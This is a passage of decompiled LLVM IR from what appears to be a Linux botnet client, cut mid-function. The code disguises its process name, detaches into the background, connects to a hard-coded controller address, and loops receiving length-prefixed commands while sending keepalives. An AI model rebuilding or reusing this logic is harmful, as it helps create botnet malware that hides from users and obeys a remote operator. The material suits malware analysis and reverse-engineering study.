  %v3_1112c = add i32 %v2_11120, -134
  %v4_1112c = inttoptr i32 %v3_1112c to i8*
  store i8 0, i8* %v4_1112c, align 1
  %v2_11134 = inttoptr i32 %v2_11124 to i8*
  %v3_11134 = call i32 @function_14634(i8* %v2_11134, i32 %v2_11104)
  %v0_11138 = call i32 @function_117dc()
  %v2_11140 = urem i32 %v0_11138, 6
  %v3_11144 = mul nuw nsw i32 %v2_11140, 4
  %v1_11148 = add nuw nsw i32 %v3_11144, 12
  store i32 %v1_11148, i32* @r4, align 4
  %v2_11154 = call i32 @function_11890(i32 %v2_11104, i32 %v1_11148)
  store i32 %v2_1111c, i32* %r2.global-to-local, align 4
  %v1_11160 = load i32, i32* @r4, align 4
  %v2_11160 = add i32 %v1_11160, %v2_1111c
  store i32 %v2_11160, i32* %r3.global-to-local, align 4
  %v0_11164 = load i32, i32* @r6, align 4
  %v1_11164 = trunc i32 %v0_11164 to i8
  %v3_11164 = add i32 %v2_11160, -134
  %v4_11164 = inttoptr i32 %v3_11164 to i8*
  store i8 %v1_11164, i8* %v4_11164, align 1
  %v4_11170 = call i32 @_prctl(i32 15, i32 %v2_11104, i32 %v2_1111c, i32 %v2_11160)
  %v1_11178 = call i32 @function_13ce8(i32 2)
  %v3_11184 = call i32 @function_13c04(i32 2, i32* nonnull %stack_var_-44)
  %v3_11188 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_11188, i32* %r2.global-to-local, align 4
  %v3_11194 = call i32 @_write(i32 1, i32 %v3_11184, i32 %v3_11188)
  store i32 1, i32* %r2.global-to-local, align 4
  %v3_111a4 = call i32 @_write(i32 1, i32 ptrtoint (i32* @global_var_14fe4.205 to i32), i32 1)
  %v1_111ac = call i32 @function_13c30(i32 2)
  %v0_111b0 = call i32 @_fork()
  %v1_111b4 = load i32, i32* @r6, align 4
  %v7_111b8 = icmp sgt i32 %v0_111b0, %v1_111b4
  br i1 %v7_111b8, label %dec_label_pc_111bc, label %dec_label_pc_1122c

dec_label_pc_111bc:                               ; preds = %dec_label_pc_110f4
  %v2_111c8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_111c8, i32* %r4.global-to-local, align 4
  store i32 %v6_10ddc, i32* %r5.global-to-local, align 4
  store i32 %v15_10ddc, i32* %r8.global-to-local, align 4
  ret i32 0

dec_label_pc_111cc:                               ; preds = %dec_label_pc_10ddc
  %v3_111d4 = call i32 @_open(i32 ptrtoint ([19 x i8]* @global_var_14fd0.207 to i32), i32 2)
  %v3_111d8 = icmp eq i32 %v3_111d4, -1
  store i32 %v3_111d4, i32* @r4, align 4
  br i1 %v3_111d8, label %dec_label_pc_10e80, label %dec_label_pc_10e54

dec_label_pc_111e8:                               ; preds = %dec_label_pc_10f3c
  %v1_111ec = call i32 @_raise(i32 5)
  br label %dec_label_pc_110d0

dec_label_pc_111f4:                               ; preds = %dec_label_pc_110d0
  %v0_111f4 = load i32, i32* @r6, align 4
  %v1_111f4 = add i32 %v0_111f4, 4
  %v2_111f4 = inttoptr i32 %v1_111f4 to i32*
  %v3_111f4 = load i32, i32* %v2_111f4, align 4
  %v1_111f8 = inttoptr i32 %v3_111f4 to i8*
  %v2_111f8 = call i32 @function_1460c(i8* %v1_111f8)
  %v8_11200 = icmp sgt i32 %v2_111f8, 31
  br i1 %v8_11200, label %dec_label_pc_110f4, label %dec_label_pc_11204

dec_label_pc_11204:                               ; preds = %dec_label_pc_111f4
  %v0_11204 = load i32, i32* @r6, align 4
  %v1_11204 = add i32 %v0_11204, 4
  %v2_11204 = inttoptr i32 %v1_11204 to i32*
  %v3_11204 = load i32, i32* %v2_11204, align 4
  store i32 %v2_110d4, i32* @r0, align 4
  %v2_1120c = bitcast i32* %stack_var_-138 to i8*
  %v3_1120c = call i32 @function_14634(i8* %v2_1120c, i32 %v3_11204)
  %v0_11210 = load i32, i32* @r6, align 4
  %v1_11210 = add i32 %v0_11210, 4
  %v2_11210 = inttoptr i32 %v1_11210 to i32*
  %v3_11210 = load i32, i32* %v2_11210, align 4
  store i32 %v3_11210, i32* %r4.global-to-local, align 4
  %v1_11218 = inttoptr i32 %v3_11210 to i8*
  %v2_11218 = call i32 @function_1460c(i8* %v1_11218)
  %v2_11224 = call i32 @function_146ac(i32 %v3_11210, i32 %v2_11218)
  br label %dec_label_pc_110f4

dec_label_pc_1122c:                               ; preds = %dec_label_pc_110f4
  %v1_1122c = call i32 @_setsid(i32 %v0_111b0)
  %v0_11234 = load i32, i32* @r6, align 4
  %v1_11238 = call i32 @_close(i32 %v0_11234)
  %v1_11240 = call i32 @_close(i32 1)
  %v1_11248 = call i32 @_close(i32 2)
  %v2_1124c = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_1124c, i32* @r7, align 4
  %v1_11250 = call i32 @function_b2b0(i32 %v1_11248)
  store i32 ptrtoint (i32* @global_var_1d908.209 to i32), i32* @sb, align 4
  %v1_11258 = call i32 @function_1042c(i32 %v1_11250)
  %v0_1125c = call i32 @function_12298()
  %v0_11260 = load i32, i32* @r6, align 4
  %v2_11268 = ptrtoint i32* %stack_var_-592 to i32
  store i32 %v2_11268, i32* @r6, align 4
  %v2_1126c = ptrtoint i32* %stack_var_-336 to i32
  store i32 %v2_1126c, i32* @r7, align 4
  %v2_1134c = ptrtoint i32* %stack_var_-60 to i32
  %v2_115fc = ptrtoint i8* %stack_var_-38 to i32
  %v2_11530 = ptrtoint i32* %stack_var_-1616 to i32
  %v2_11620 = ptrtoint i32* %stack_var_-48 to i32
  %v2_11624 = ptrtoint i32* %stack_var_-52 to i32
  %v1_116b4 = bitcast i32* %stack_var_-138 to i8*
  %v2_11680 = ptrtoint i32* %stack_var_-88 to i32
  %v1_116a0 = sub i32 0, %v1_1122c
  br label %dec_label_pc_11270

dec_label_pc_11270:                               ; preds = %dec_label_pc_11270.backedge, %dec_label_pc_1122c
  %v2_1127887 = phi i32 [ %v2_11268, %dec_label_pc_1122c ], [ %v2_1127887.pre, %dec_label_pc_11270.backedge ]
  %stack_var_-37.0 = phi i8 [ %tmp13, %dec_label_pc_1122c ], [ %stack_var_-37.0.be, %dec_label_pc_11270.backedge ]
  %stack_var_-1620.0 = phi i32 [ %v0_11260, %dec_label_pc_1122c ], [ %stack_var_-1620.0.be, %dec_label_pc_11270.backedge ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_1127889 = inttoptr i32 %v2_1127887 to i32*
  store i32 0, i32* %v4_1127889, align 4
  %v0_1127c90 = load i32, i32* %r3.global-to-local, align 4
  %v1_1127c91 = add i32 %v0_1127c90, 4
  store i32 %v1_1127c91, i32* %r3.global-to-local, align 4
  %v7_1128092 = icmp eq i32 %v1_1127c91, 128
  br i1 %v7_1128092, label %dec_label_pc_11288, label %dec_label_pc_11278.dec_label_pc_11278_crit_edge

dec_label_pc_11278.dec_label_pc_11278_crit_edge:  ; preds = %dec_label_pc_11270, %dec_label_pc_11278.dec_label_pc_11278_crit_edge
  %v1_1127c93 = phi i32 [ %v1_1127c, %dec_label_pc_11278.dec_label_pc_11278_crit_edge ], [ %v1_1127c91, %dec_label_pc_11270 ]
  %v0_11278.pre = load i32, i32* %r2.global-to-local, align 4
  %v2_11278 = load i32, i32* @r6, align 4
  %v3_11278 = add i32 %v2_11278, %v1_1127c93
  %v4_11278 = inttoptr i32 %v3_11278 to i32*
  store i32 %v0_11278.pre, i32* %v4_11278, align 4
  %v0_1127c = load i32, i32* %r3.global-to-local, align 4
  %v1_1127c = add i32 %v0_1127c, 4
  store i32 %v1_1127c, i32* %r3.global-to-local, align 4
  %v7_11280 = icmp eq i32 %v1_1127c, 128
  br i1 %v7_11280, label %dec_label_pc_11288, label %dec_label_pc_11278.dec_label_pc_11278_crit_edge

dec_label_pc_11288:                               ; preds = %dec_label_pc_11278.dec_label_pc_11278_crit_edge, %dec_label_pc_11270
  %v0_11288 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_11288, i32* %r3.global-to-local, align 4
  store i32 %v0_11288, i32* @r4, align 4
  %v2_1129094 = load i32, i32* @r7, align 4
  %v3_1129095 = add i32 %v2_1129094, %v0_11288
  %v4_1129096 = inttoptr i32 %v3_1129095 to i32*
  store i32 %v0_11288, i32* %v4_1129096, align 4
  %v0_1129497 = load i32, i32* %r3.global-to-local, align 4
  %v1_1129498 = add i32 %v0_1129497, 4
  store i32 %v1_1129498, i32* %r3.global-to-local, align 4
  %v7_1129899 = icmp eq i32 %v1_1129498, 128
  br i1 %v7_1129899, label %dec_label_pc_112a0, label %dec_label_pc_11290.dec_label_pc_11290_crit_edge

dec_label_pc_11290.dec_label_pc_11290_crit_edge:  ; preds = %dec_label_pc_11288, %dec_label_pc_11290.dec_label_pc_11290_crit_edge
  %v1_11294100 = phi i32 [ %v1_11294, %dec_label_pc_11290.dec_label_pc_11290_crit_edge ], [ %v1_1129498, %dec_label_pc_11288 ]
  %v0_11290.pre = load i32, i32* @r4, align 4
  %v2_11290 = load i32, i32* @r7, align 4
  %v3_11290 = add i32 %v2_11290, %v1_11294100
  %v4_11290 = inttoptr i32 %v3_11290 to i32*
  store i32 %v0_11290.pre, i32* %v4_11290, align 4
  %v0_11294 = load i32, i32* %r3.global-to-local, align 4
  %v1_11294 = add i32 %v0_11294, 4
  store i32 %v1_11294, i32* %r3.global-to-local, align 4
  %v7_11298 = icmp eq i32 %v1_11294, 128
  br i1 %v7_11298, label %dec_label_pc_112a0, label %dec_label_pc_11290.dec_label_pc_11290_crit_edge

dec_label_pc_112a0:                               ; preds = %dec_label_pc_11290.dec_label_pc_11290_crit_edge, %dec_label_pc_11288
  store i32 ptrtoint (i32* @global_var_1d904.169 to i32), i32* %r3.global-to-local, align 4
  %v2_112a4 = load i32, i32* @global_var_1d904.169, align 4
  %v7_112a8 = icmp eq i32 %v2_112a4, -1
  br i1 %v7_112a8, label %dec_label_pc_112d8, label %dec_label_pc_112b0

dec_label_pc_112b0:                               ; preds = %dec_label_pc_112a0
  %v3_112b0 = udiv i32 %v2_112a4, 32
  %v3_112b8 = mul nuw nsw i32 %v3_112b0, 4
  %v2_112c0 = add i32 %v3_112b8, %v2_1111c
  store i32 %v2_112c0, i32* %r3.global-to-local, align 4
  %v1_112c4 = add i32 %v2_112c0, -556
  %v2_112c4 = inttoptr i32 %v1_112c4 to i32*
  %v3_112c4 = load i32, i32* %v2_112c4, align 4
  %v1_112c8 = urem i32 %v2_112a4, 32
  %v7_112d0 = shl i32 1, %v1_112c8
  %v8_112d0 = or i32 %v3_112c4, %v7_112d0
  store i32 %v8_112d0, i32* %r2.global-to-local, align 4
  store i32 %v8_112d0, i32* %v2_112c4, align 4
  br label %dec_label_pc_112d8

dec_label_pc_112d8:                               ; preds = %dec_label_pc_112a0, %dec_label_pc_112b0
  %v2_112d8 = load i32, i32* @global_var_1d908.209, align 4
  store i32 %v2_112d8, i32* %r3.global-to-local, align 4
  %v7_112dc = icmp eq i32 %v2_112d8, -1
  store i32 ptrtoint (i32* @global_var_1d908.209 to i32), i32* %r8.global-to-local, align 4
  br i1 %v7_112dc, label %dec_label_pc_11580, label %dec_label_pc_112e8

dec_label_pc_112e8:                               ; preds = %dec_label_pc_11580, %dec_label_pc_112d8, %.thread
  store i32 ptrtoint (i8** @global_var_1d960.212 to i32), i32* %r2.global-to-local, align 4
  %v2_112ec = load i8, i8* bitcast (i8** @global_var_1d960.212 to i8*), align 4
  %v3_112ec = zext i8 %v2_112ec to i32
  store i32 %v3_112ec, i32* %r3.global-to-local, align 4
  %v2_112f0 = icmp eq i8 %v2_112ec, 0
  %v2_11440 = load i32, i32* @global_var_1d908.209, align 4
  %v3_11448 = udiv i32 %v2_11440, 32
  br i1 %v2_112f0, label %dec_label_pc_11440, label %dec_label_pc_112f8

dec_label_pc_112f8:                               ; preds = %dec_label_pc_112e8
  %v3_11304 = mul nuw nsw i32 %v3_11448, 4
  %v2_1130c = add i32 %v3_11304, %v2_1111c
  store i32 %v2_1130c, i32* %r3.global-to-local, align 4
  %v1_11310 = add i32 %v2_1130c, -300
  %v2_11310 = inttoptr i32 %v1_11310 to i32*
  %v3_11310 = load i32, i32* %v2_11310, align 4
  %v1_11314 = urem i32 %v2_11440, 32
  %v7_1131c = shl i32 1, %v1_11314
  %v8_1131c = or i32 %v3_11310, %v7_1131c
  store i32 %v8_1131c, i32* %r2.global-to-local, align 4
  store i32 %v8_1131c, i32* %v2_11310, align 4
  br label %dec_label_pc_11324

dec_label_pc_11324:                               ; preds = %dec_label_pc_11440, %dec_label_pc_112f8
  %v2_11328 = load i32, i32* @global_var_1d904.169, align 4
  %v2_1132c = load i32, i32* @global_var_1d908.209, align 4
  store i32 %v2_1132c, i32* %r3.global-to-local, align 4
  %v5_11338 = icmp slt i32 %v2_11328, %v2_1132c
  br i1 %v5_11338, label %bb, label %bb84

bb:                                               ; preds = %dec_label_pc_11324
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_11324, %bb
  %v0_11348 = phi i32 [ %v2_11328, %dec_label_pc_11324 ], [ %v2_1132c, %bb ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 10, i32* %stack_var_-60, align 4
  %v1_11348 = add i32 %v0_11348, 1
  store i32 %v2_1126c, i32* %r2.global-to-local, align 4
  %v5_11360 = call i32 @_select(i32 %v1_11348, i32 %v2_11268, i32 %v2_1126c, i32 0, i32 %v2_1134c)
  %v8_11364 = icmp eq i32 %v5_11360, -1
  store i32 %v5_11360, i32* %r3.global-to-local, align 4
  br i1 %v8_11364, label %dec_label_pc_11270.backedge, label %dec_label_pc_11370

dec_label_pc_11370:                               ; preds = %bb84
  %v6_11360 = trunc i32 %v5_11360 to i8
  %v3_11370 = icmp eq i8 %v6_11360, 0
  br i1 %v3_11370, label %dec_label_pc_11378, label %dec_label_pc_113a0

dec_label_pc_11378:                               ; preds = %dec_label_pc_11370
  store i8 0, i8* %stack_var_-38, align 1
  %v2_11388 = srem i32 %stack_var_-1620.0, 6
  %v2_11390 = icmp eq i32 %v2_11388, 0
  %v1_11394 = add i32 %stack_var_-1620.0, 1
  store i32 %v1_11394, i32* %r2.global-to-local, align 4
  br i1 %v2_11390, label %dec_label_pc_115f0, label %dec_label_pc_113a0

dec_label_pc_113a0:                               ; preds = %dec_label_pc_11370, %dec_label_pc_11378, %dec_label_pc_115f0
  %stack_var_-37.1 = phi i8 [ 0, %dec_label_pc_115f0 ], [ 0, %dec_label_pc_11378 ], [ %stack_var_-37.0, %dec_label_pc_11370 ]
  %stack_var_-1620.1 = phi i32 [ %v1_11394, %dec_label_pc_115f0 ], [ %v1_11394, %dec_label_pc_11378 ], [ %stack_var_-1620.0, %dec_label_pc_11370 ]
  store i32 ptrtoint (i32* @global_var_1d904.169 to i32), i32* %r3.global-to-local, align 4
  %v2_113a4 = load i32, i32* @global_var_1d904.169, align 4
  %v7_113a8 = icmp eq i32 %v2_113a4, -1
  br i1 %v7_113a8, label %dec_label_pc_113d8, label %dec_label_pc_113b0

dec_label_pc_113b0:                               ; preds = %dec_label_pc_113a0
  %v3_113b0 = udiv i32 %v2_113a4, 32
  %v3_113b8 = mul nuw nsw i32 %v3_113b0, 4
  %v2_113c0 = add i32 %v3_113b8, %v2_1111c
  store i32 %v2_113c0, i32* %r3.global-to-local, align 4
  %v1_113c4 = add i32 %v2_113c0, -556
  %v2_113c4 = inttoptr i32 %v1_113c4 to i32*
  %v3_113c4 = load i32, i32* %v2_113c4, align 4
  %v1_113c8 = urem i32 %v2_113a4, 32
  %v6_113cc = lshr i32 %v3_113c4, %v1_113c8
  store i32 %v6_113cc, i32* %r2.global-to-local, align 4
  %v1_113d0 = urem i32 %v6_113cc, 2
  %v2_113d0 = icmp eq i32 %v1_113d0, 0
  store i1 %v2_113d0, i1* @cpsr_z, align 1
  br i1 %v2_113d0, label %dec_label_pc_113d8, label %dec_label_pc_11670

dec_label_pc_113d8:                               ; preds = %dec_label_pc_113b0, %dec_label_pc_113a0
  store i32 ptrtoint (i8** @global_var_1d960.212 to i32), i32* %r3.global-to-local, align 4
  %v2_113dc = load i8, i8* bitcast (i8** @global_var_1d960.212 to i8*), align 4
  %v3_113dc = zext i8 %v2_113dc to i32
  store i32 %v3_113dc, i32* %r4.global-to-local, align 4
  %v2_113e0 = icmp eq i8 %v2_113dc, 0
  %v2_11470 = load i32, i32* @global_var_1d908.209, align 4
  br i1 %v2_113e0, label %dec_label_pc_11470, label %dec_label_pc_113e8

dec_label_pc_113e8:                               ; preds = %dec_label_pc_113d8
  %v3_113f0 = udiv i32 %v2_11470, 32
  %v3_113f8 = mul nuw nsw i32 %v3_113f0, 4
  %v2_113fc = add i32 %v3_113f8, %v2_1111c
  store i32 %v2_113fc, i32* %r3.global-to-local, align 4
  %v1_11400 = add i32 %v2_113fc, -300
  %v2_11400 = inttoptr i32 %v1_11400 to i32*
  %v3_11400 = load i32, i32* %v2_11400, align 4
  %v1_11404 = urem i32 %v2_11470, 32
  %v6_11408 = lshr i32 %v3_11400, %v1_11404
  store i32 %v6_11408, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1d960.212 to i32), i32* %r3.global-to-local, align 4
  %v1_11414 = urem i32 %v6_11408, 2
  %v2_11414 = icmp eq i32 %v1_11414, 0
  store i8 0, i8* bitcast (i8** @global_var_1d960.212 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_1d908.209 to i32), i32* @r5, align 4
  br i1 %v2_11414, label %dec_label_pc_11424, label %dec_label_pc_11610

dec_label_pc_11424:                               ; preds = %dec_label_pc_113e8
  %v1_11428 = icmp ne i32 %v2_11470, -1
  call void @__pseudo_cond_branch(i1 %v1_11428, i32 ptrtoint (i32* @global_var_8dcc.80 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_11430 = load i32, i32* @r5, align 4
  %v2_11430 = inttoptr i32 %v1_11430 to i32*
  store i32 -1, i32* %v2_11430, align 4
  %v1_11438 = call i32 @_sleep(i32 1)
  br label %dec_label_pc_11270.backedge

dec_label_pc_11270.backedge:                      ; preds = %dec_label_pc_11424, %dec_label_pc_1155c, %dec_label_pc_11648, %dec_label_pc_116fc, %dec_label_pc_11724, %dec_label_pc_11794, %bb84, %dec_label_pc_11470, %dec_label_pc_11480, %dec_label_pc_116b0, %bb86, %dec_label_pc_11740, %dec_label_pc_11710
  %stack_var_-37.0.be = phi i8 [ %stack_var_-37.0, %bb84 ], [ %stack_var_-37.1, %dec_label_pc_11470 ], [ %stack_var_-37.1, %dec_label_pc_11480 ], [ %stack_var_-37.3, %bb86 ], [ %stack_var_-37.2, %dec_label_pc_1155c ], [ %stack_var_-37.1, %dec_label_pc_11724 ], [ %v3_11758, %dec_label_pc_11740 ], [ %v3_11758, %dec_label_pc_11794 ], [ %stack_var_-37.1, %dec_label_pc_11424 ], [ %stack_var_-37.1, %dec_label_pc_116b0 ], [ %stack_var_-37.1, %dec_label_pc_116fc ], [ %stack_var_-37.1, %dec_label_pc_11648 ], [ %stack_var_-37.3, %dec_label_pc_11710 ]
  %stack_var_-1620.0.be = phi i32 [ %stack_var_-1620.0, %bb84 ], [ %stack_var_-1620.1, %dec_label_pc_11470 ], [ %stack_var_-1620.1, %dec_label_pc_11480 ], [ %stack_var_-1620.1, %bb86 ], [ %stack_var_-1620.1, %dec_label_pc_1155c ], [ %stack_var_-1620.1, %dec_label_pc_11724 ], [ %stack_var_-1620.1, %dec_label_pc_11740 ], [ %stack_var_-1620.1, %dec_label_pc_11794 ], [ %stack_var_-1620.1, %dec_label_pc_11424 ], [ %stack_var_-1620.1, %dec_label_pc_116b0 ], [ %stack_var_-1620.1, %dec_label_pc_116fc ], [ %stack_var_-1620.1, %dec_label_pc_11648 ], [ %stack_var_-1620.1, %dec_label_pc_11710 ]
  %v2_1127887.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11270

dec_label_pc_11440:                               ; preds = %dec_label_pc_112e8
  store i32 %v2_1111c, i32* %r2.global-to-local, align 4
  %v3_11450 = mul nuw nsw i32 %v3_11448, 4
  %v2_11454 = add i32 %v3_11450, %v2_1111c
  store i32 %v2_11454, i32* %r3.global-to-local, align 4
  %v1_11458 = add i32 %v2_11454, -556
  %v2_11458 = inttoptr i32 %v1_11458 to i32*
  %v3_11458 = load i32, i32* %v2_11458, align 4
  %v1_1145c = urem i32 %v2_11440, 32
  %v7_11464 = shl i32 1, %v1_1145c
  %v8_11464 = or i32 %v3_11458, %v7_11464
  store i32 %v8_11464, i32* %r2.global-to-local, align 4
  store i32 %v8_11464, i32* %v2_11458, align 4
  br label %dec_label_pc_11324

dec_label_pc_11470:                               ; preds = %dec_label_pc_113d8
  %v7_11474 = icmp eq i32 %v2_11470, -1
  store i32 ptrtoint (i32* @global_var_1d908.209 to i32), i32* @r5, align 4
  br i1 %v7_11474, label %dec_label_pc_11270.backedge, label %dec_label_pc_11480

dec_label_pc_11480:                               ; preds = %dec_label_pc_11470
  %v3_11480 = udiv i32 %v2_11470, 32
  store i32 %v2_1111c, i32* %r2.global-to-local, align 4
  %v3_1148c = mul nuw nsw i32 %v3_11480, 4
  %v2_11490 = add i32 %v3_1148c, %v2_1111c
  store i32 %v2_11490, i32* %r3.global-to-local, align 4
  %v1_11494 = add i32 %v2_11490, -556
  %v2_11494 = inttoptr i32 %v1_11494 to i32*
  %v3_11494 = load i32, i32* %v2_11494, align 4
  %v1_11498 = urem i32 %v2_11470, 32
  %v6_1149c = lshr i32 %v3_11494, %v1_11498
  store i32 %v6_1149c, i32* %r2.global-to-local, align 4
  %v1_114a0 = urem i32 %v6_1149c, 2
  %v2_114a0 = icmp eq i32 %v1_114a0, 0
  br i1 %v2_114a0, label %dec_label_pc_11270.backedge, label %dec_label_pc_114a8

dec_label_pc_114a8:                               ; preds = %dec_label_pc_11480
  %v0_114a8 = call i32 @___errno_location()
  %v0_114ac = load i32, i32* %r4.global-to-local, align 4
  %v2_114ac = inttoptr i32 %v0_114a8 to i32*
  store i32 %v0_114ac, i32* %v2_114ac, align 4
  store i32 %v0_114a8, i32* @r8, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_114c0 = load i32, i32* @global_var_1d908.209, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_114cc = call i32 @_recv(i32 %v2_114c0, i32 %v2_115fc, i32 2, i32 16386)
  %v7_114d0 = icmp eq i32 %v4_114cc, -1
  br i1 %v7_114d0, label %dec_label_pc_11710, label %dec_label_pc_114d8

dec_label_pc_114d8:                               ; preds = %dec_label_pc_114a8
  %v2_114d8 = icmp eq i32 %v4_114cc, 0
  br i1 %v2_114d8, label %dec_label_pc_1155c, label %dec_label_pc_114e0

dec_label_pc_114e0:                               ; preds = %dec_label_pc_114d8
  %v3_114e0 = load i8, i8* %stack_var_-38, align 1
  %v4_114e0 = sext i8 %v3_114e0 to i32
  %v4_114e4 = zext i8 %stack_var_-37.1 to i32
  store i32 %v4_114e4, i32* %r3.global-to-local, align 4
  %v4_114e8 = mul nuw nsw i32 %v4_114e4, 256
  %v5_114e8 = or i32 %v4_114e0, %v4_114e8
  store i32 %v5_114e8, i32* %r2.global-to-local, align 4
  %v7_114e8 = icmp eq i32 %v5_114e8, 0
  br i1 %v7_114e8, label %dec_label_pc_11724, label %dec_label_pc_114f0

dec_label_pc_114f0:                               ; preds = %dec_label_pc_114e0
  %v1_114f0 = mul nsw i32 %v4_114e0, 256
  %v3_114f4 = and i32 %v1_114f0, 65280
  %v4_114f8 = udiv i32 %v5_114e8, 256
  %v5_114f8 = or i32 %v3_114f4, %v4_114f8
  store i32 %v5_114f8, i32* %r3.global-to-local, align 4
  %v3_114fc4 = udiv i32 %v5_114f8, 256
  store i32 %v3_114fc4, i32* %r2.global-to-local, align 4
  %v1_11504 = trunc i32 %v3_114fc4 to i8
  %v6_11508 = trunc i32 %v4_114f8 to i8
  store i8 %v6_11508, i8* %stack_var_-38, align 1
  %tmp103 = icmp ult i32 %v5_114f8, 1025
  br i1 %tmp103, label %dec_label_pc_11520, label %dec_label_pc_11510

dec_label_pc_11510:                               ; preds = %dec_label_pc_114f0
  %v2_11510 = load i32, i32* @global_var_1d908.209, align 4
  %v1_11514 = call i32 @_close(i32 %v2_11510)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1151c = load i32, i32* @r5, align 4
  %v2_1151c = inttoptr i32 %v1_1151c to i32*
  store i32 -1, i32* %v2_1151c, align 4
  %v3_11528.pre = load i8, i8* %stack_var_-38, align 1
  br label %dec_label_pc_11520

dec_label_pc_11520:                               ; preds = %dec_label_pc_114f0, %dec_label_pc_11510
  %v3_11528 = phi i8 [ %v6_11508, %dec_label_pc_114f0 ], [ %v3_11528.pre, %dec_label_pc_11510 ]
  %v0_11520 = load i32, i32* %r4.global-to-local, align 4
  %v1_11520 = load i32, i32* @r8, align 4
  %v2_11520 = inttoptr i32 %v1_11520 to i32*
  store i32 %v0_11520, i32* %v2_11520, align 4
  %v4_11524 = urem i32 %v3_114fc4, 256
  %v4_11528 = sext i8 %v3_11528 to i32
  store i32 %v2_11530, i32* @r4, align 4
  %v4_11538 = mul nuw nsw i32 %v4_11524, 256
  %v5_11538 = or i32 %v4_11528, %v4_11538
  store i32 %v5_11538, i32* %r2.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_11540 = load i32, i32* @global_var_1d908.209, align 4
  %v4_11548 = call i32 @_recv(i32 %v2_11540, i32 %v2_11530, i32 %v5_11538, i32 16386)
  %v7_1154c = icmp eq i32 %v4_11548, -1
  br i1 %v7_1154c, label %dec_label_pc_11710, label %dec_label_pc_11554

dec_label_pc_11554:                               ; preds = %dec_label_pc_11520
  %v2_11554 = icmp eq i32 %v4_11548, 0
  br i1 %v2_11554, label %dec_label_pc_1155c, label %dec_label_pc_11740

dec_label_pc_1155c:                               ; preds = %bb86, %dec_label_pc_11554, %dec_label_pc_114d8
  %stack_var_-37.2 = phi i8 [ %stack_var_-37.3, %bb86 ], [ %stack_var_-37.1, %dec_label_pc_114d8 ], [ %v1_11504, %dec_label_pc_11554 ]
  %v2_1155c = load i32, i32* @global_var_1d908.209, align 4
  %v1_11564 = icmp ne i32 %v2_1155c, -1
  call void @__pseudo_cond_branch(i1 %v1_11564, i32 ptrtoint (i32* @global_var_8dcc.80 to i32))
  store i32 ptrtoint (i32* @global_var_1d908.209 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_1d908.209, align 4
  %v1_11578 = call i32 @_sleep(i32 1)
  br label %dec_label_pc_11270.backedge

dec_label_pc_11580:                               ; preds = %dec_label_pc_112d8
  %v0_11588 = load i32, i32* @r4, align 4
  store i32 %v0_11588, i32* %r2.global-to-local, align 4
  %v3_1158c = call i32 @_socket(i32 2, i32 1, i32 %v0_11588)
  %v7_11590 = icmp eq i32 %v3_1158c, -1
  store i32 %v3_1158c, i32* %r5.global-to-local, align 4
  %v1_11598 = load i32, i32* %r8.global-to-local, align 4
  %v2_11598 = inttoptr i32 %v1_11598 to i32*
  store i32 %v3_1158c, i32* %v2_11598, align 4
  br i1 %v7_11590, label %dec_label_pc_112e8, label %dec_label_pc_115a0

dec_label_pc_115a0:                               ; preds = %dec_label_pc_11580
  %v0_115a0 = load i32, i32* @r4, align 4
  store i32 %v0_115a0, i32* %r2.global-to-local, align 4
  %v3_115a8 = call i32 @_fcntl(i32 %v3_1158c, i32 3, i32 %v0_115a0)
  %v1_115b0 = or i32 %v3_115a8, 2048
  store i32 %v1_115b0, i32* %r2.global-to-local, align 4
  %v0_115b4 = load i32, i32* %r5.global-to-local, align 4
  %v3_115b8 = call i32 @_fcntl(i32 %v0_115b4, i32 4, i32 %v1_115b0)
  %v2_115c0 = load i32, i32* @global_var_1d90c.167, align 4
  store i32 %v2_115c0, i32* %r3.global-to-local, align 4
  %v2_115c4 = icmp eq i32 %v2_115c0, 0
  br i1 %v2_115c4, label %.thread, label %bb85

bb85:                                             ; preds = %dec_label_pc_115a0
  call void @__pseudo_branch(i32 ptrtoint (i32* @global_var_148c4.214 to i32))
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_115a0, %bb85
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_115d8 = load i32, i32* @global_var_1d908.209, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_1d960.212 to i8*), align 4
  %v4_115e8 = call i32 @_connect(i32 %v2_115d8, i32 ptrtoint (i8** @global_var_1d9b8.174 to i32), i32 16)
  br label %dec_label_pc_112e8

dec_label_pc_115f0:                               ; preds = %dec_label_pc_11378
  %v2_115f8 = load i32, i32* @global_var_1d908.209, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_11608 = call i32 @_send(i32 %v2_115f8, i32 %v2_115fc, i32 2, i32 16384)
  br label %dec_label_pc_113a0

dec_label_pc_11610:                               ; preds = %dec_label_pc_113e8
  store i32 4, i32* @r4, align 4
  store i32 0, i32* %stack_var_-48, align 4
  store i32 %v2_11620, i32* %r3.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-52, align 4
  %v5_11638 = call i32 @_getsockopt(i32 %v2_11470, i32 1, i32 4, i32 %v2_11620, i32 %v2_11624)
  %v3_1163c = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_1163c, i32* %r3.global-to-local, align 4
  %v2_11640 = icmp eq i32 %v3_1163c, 0
  br i1 %v2_11640, label %dec_label_pc_116b0, label %dec_label_pc_11648

dec_label_pc_11648:                               ; preds = %dec_label_pc_11610
  %v2_11648 = load i32, i32* @global_var_1d908.209, align 4
